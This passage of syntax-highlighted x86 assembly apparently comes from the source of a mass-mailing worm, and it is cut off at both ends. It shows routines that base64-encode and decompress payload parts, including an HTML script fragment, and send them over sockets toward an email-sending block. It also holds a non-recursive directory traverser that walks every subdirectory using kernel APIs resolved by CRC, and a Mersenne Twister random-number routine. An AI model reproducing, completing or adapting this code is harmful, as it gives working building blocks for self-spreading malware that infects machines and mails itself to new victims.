        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cCloseHandle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">b64encode</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cGlobalFree</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decompmain</span><span class="sc0">                      </span><span class="sc1">;part31 ("&lt;script&gt;moveBy...")</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decompoct</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc12">'--'</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0a0dh</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">bound_copy</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randlines</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decompmain</span><span class="sc0">                      </span><span class="sc1">;part41</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">senddata</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decompmain</span><span class="sc0">                      </span><span class="sc1">;part42</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">senddata</span><span class="sc0">

</span><span class="sc5">skip_send</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cGlobalFree</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">send_email</span><span class="sc0">

</span><span class="sc5">email_block</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">email.inc</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Mersenne Twister RNG MT19937 (c) 1997 Makoto Matsumoto and Takuji Nishimura</span><span class="sc0">
</span><span class="sc1">;period is ((2^19937)-1) with 623-dimensionally equidistributed sequence</span><span class="sc0">
</span><span class="sc1">;asm port and size optimise by rgb in 2002</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">randinit</span><span class="sc0">        </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;eax = seed, ecx = 0, edi -&gt; RNG cache</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">statelen</span><span class="sc0">

</span><span class="sc5">init_loop</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">69069</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">;Knuth: x_new = x_old * 69069</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">init_loop</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;force reload</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">initdelta</span><span class="sc0">

</span><span class="sc5">initdelta</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">randvars</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">initdelta</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">randinit</span><span class="sc0">        </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">random</span><span class="sc0">          </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randelta</span><span class="sc0">

</span><span class="sc5">randvars</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'rgb!'</span><span class="sc0">                          </span><span class="sc1">;numbers left</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'rgb!'</span><span class="sc0">                          </span><span class="sc1">;next pointer</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'rgb!'</span><span class="sc0">                          </span><span class="sc1">;state pointer</span><span class="sc0">

</span><span class="sc5">randelta</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">random_ret</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">statelen</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">period</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">period</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">twist</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">period</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">twist</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">twist</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">random_ret</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">tshiftU</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">tshiftS</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">tmaskB</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">tshiftT</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">tmaskC</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">tshiftL</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">;eax in pushad</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">random</span><span class="sc0">          </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">twist</span><span class="sc0">           </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;remove highest bit</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                        </span><span class="sc1">;test highest bit</span><span class="sc0">
        </span><span class="sc6">rcr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                          </span><span class="sc1">;merge bits and test lowest bit</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">twist_skip</span><span class="sc0">                      </span><span class="sc1">;remove branch but larger using:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">matrixA</span><span class="sc0">                    </span><span class="sc1">;sbb edx, edx+and edx, matrixA+xor eax, edx</span><span class="sc0">

</span><span class="sc5">twist_skip</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">twist</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">twist</span><span class="sc0">           </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">senddata</span><span class="sc0">        </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">store_socket</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc3">"!bgr"</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">store_send</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc3">"!bgr"</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">senddata</span><span class="sc0">        </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;non-recursive directory traverser</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">find_files</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">findlist</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GMEM_ZEROINIT</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cGlobalAlloc</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">file_exit</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_krnapis</span><span class="sc0">

</span><span class="sc5">file_first</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc12">'*'</span><span class="sc0">                             </span><span class="sc1">;ANSI-compatible Unicode findmask</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">findlist.finddata</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">krncrcstk.kFindFirstFileW</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">findlist.findhand</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">file_prev</span><span class="sc0">

        </span><span class="sc1">;you must always step forward from where you stand</span><span class="sc0">

</span><span class="sc5">test_dirfile</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA.dwFileAttributes</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">findlist.finddata.cFileName</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">test_file</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0">             </span><span class="sc1">;ignore . and .. (but also .* directories under NT/2000/XP)</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">file_next</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;enter subdirectory, and allocate another list node</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">krncrcstk.kSetCurrentDirectoryW</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">file_next</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">findlist</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GMEM_FIXED</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cGlobalAlloc</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">step_updir</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">findlist.findprev</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">file_first</span><span class="sc0">

</span><span class="sc5">file_exit</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">file_next</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">findlist.finddata</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">findlist.findhand</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">krncrcstk.kFindNextFileW</span><span class="sc4">]</span><span class="sc0">
